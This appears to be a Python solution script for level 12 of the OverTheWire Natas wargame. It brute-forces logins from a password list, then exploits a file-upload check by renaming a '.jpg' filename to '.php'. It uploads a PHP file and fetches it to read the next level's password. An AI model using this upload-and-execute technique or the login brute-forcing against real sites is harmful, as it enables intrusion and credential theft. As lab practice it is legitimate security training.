#!/usr/bin/env python


import requests
import re

from pathlib import Path
from bs4 import BeautifulSoup


password_file = Path('../passwords.txt')


level = 12
username = '%s%s' % ('natas', level)
passwords = open(password_file, 'r').readlines()

url = 'http://%s.natas.labs.overthewire.org/' % username

if __name__ == '__main__':

    # Read passwords and enforce bruteforce
    for password in passwords:

        password = password.strip()

        # Pass the username, password login to server
        http = requests.post(url, auth=(username, password))

        if http.status_code != 200:
            pass

        else:

            # Create a BS parser
            http_login = BeautifulSoup(http.text, 'html.parser')

            # Find the data
            file_name = http_login.find_all('input', type='hidden')

            # Modify the .jpg file to .php file
            file_name = str(file_name[1]['value']).replace('.jpg', '.php')

            # File data to upload
            file_data = {
                'uploadedfile': open('showpass.php', 'rb')
            }

            # POST data to send to the server
            post_data = {
                'MAX_FILE_SIZE': '1000',
                'filename': file_name,
                'uploadedfile': file_data,
                'submit': 'submit'
            }

            # send the files data to upload
            send_file = requests.post(url, auth=(username, password), data=post_data, files=file_data)

            # Check the response of the server after uploading
            soup = BeautifulSoup(send_file.text, 'html.parser')
            result = soup.select('#content')[0].text

            # Clean the values of response
            source = ''

            for index, i in enumerate(result):

                # Filter the result until filename
                source += i
                if index == 49:
                    break

            # Print the result of uploaded file
            # print('%s' % source)

            uploaded_file = re.search(r'[a-zA-Z0-9]{10}.[a-zA-Z]{3}', source).group(0)

            # Parse the result of the .php file uploaded
            read_result = requests.get('%supload/%s' % (url, uploaded_file), auth=(username, password))

            # Check response code of requested URL
            if read_result.status_code != 200:
                pass

            else:

                # Read the password for natas13
                soup = BeautifulSoup(read_result.text, 'html.parser')
                flag = soup.select('pre')[0].text

                print(flag, end='')

                # Save the flag
                with open('flag.txt', 'w') as out:
                    out.write(flag)

                    out.close()

                break
